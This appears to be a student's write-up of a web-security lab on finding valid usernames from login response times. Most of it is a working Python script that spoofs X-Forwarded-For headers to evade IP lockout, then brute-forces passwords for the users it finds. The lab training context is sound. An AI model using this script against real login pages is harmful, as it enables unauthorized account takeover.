# Lab - 03: Auth

Topic :  Username enumeration via response timing

Auth : Difference in Response Timing 

End Goal : Finding username and password 

Analysis : 

1. We have to find the correct username by giving a long password which is checked if only the username is correct. In this way we can filter the correct usernames and brute force them.
2. Also there is an Ip brute force protection, so we generate random fake ip’s which will be used to bypass this 
3. Default credentials: “wiener:peter”
4. Script used 
    
    ```python
    #!/usr/bin/env python3
    
    import requests
    import random
    import sys
    
    def createList(filename):
        with open(filename, "r") as f:
            return [line.strip() for line in f]
    
    def generateFakeIp():
        p1 = random.randint(0, 255)
        p2 = random.randint(0, 255)
        p3 = random.randint(0, 255)
        p4 = random.randint(0, 255)
    
        return f"{p1}.{p2}.{p3}.{p4}"
    
    def gettingResponseTime(URL, user):
        data = {
            "username":user,
            "password":"peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter"
        }
    
        # Getting away with ip brute force protection
        fakeIp = generateFakeIp()
    
        headers = {
            "X-Forwarded-For": fakeIp
        }
    
        r = requests.post(URL, data=data, headers=headers)
    
        if "You have made too many incorrect login attempts. Please try again in 30 minute(s)" in r.text:
            print("Bruteforce blocked!")
            return
    
        print("-" * 50)
        print("User: ", user)
        print('Response Time: ', r.elapsed.total_seconds())
        print("Status Code: ", r.status_code)
        print("-" * 50)
    
        return r.elapsed.total_seconds()
    
    def findingValidUser(URL, usernames):
    
        valid_users=[]
    
        for user in usernames:
            response_time = gettingResponseTime(URL, user)
            
            if response_time > 1:
                valid_users.append(user)
    
        return valid_users
    
    def findCreds(URL, valid_users, passwords, i=0):
    
        finalCredList = []
    
        for user in valid_users:
            for password in passwords:
                
                print(i) # basic feedback
                i+=1
    
                data = {
                    "username":user,
                    "password":password
                }
    
                # Getting away with ip brute force protection
                fakeIp = generateFakeIp()
    
                headers = {
                    "X-Forwarded-For": fakeIp
                }
    
                r = requests.post(URL, data=data, headers=headers)
    
                if "You have made too many incorrect login attempts. Please try again in 30 minute(s)" in r.text:
                    print("Bruteforce blocked!")
                    return
                
                if "Invalid username or password." not in r.text:
                    print(f"Credentials: user: {user}, password: {password}")
                    finalCredList.append([user, password])
        
        return finalCredList
    
    def main():
    
        if len(sys.argv) < 3 :
            print("2 arguments REQUIRED -> <username_file> <password_file>")
            sys.exit(0)
    
        user_file = sys.argv[1]
        pass_file = sys.argv[2]
    
        URL = "https://0ae200b704191678810fd4d8004a00c5.web-security-academy.net/login"
    
        # Creating lists
        usernames = createList(user_file)
        passwords = createList(pass_file)
    
        # Finding valid users
        valid_user_list = findingValidUser(URL, usernames)
    
        print(valid_user_list)
        res = findCreds(URL, valid_user_list, passwords)
        print(res)
    
    if __name__ == "__main__":
        main()
    ```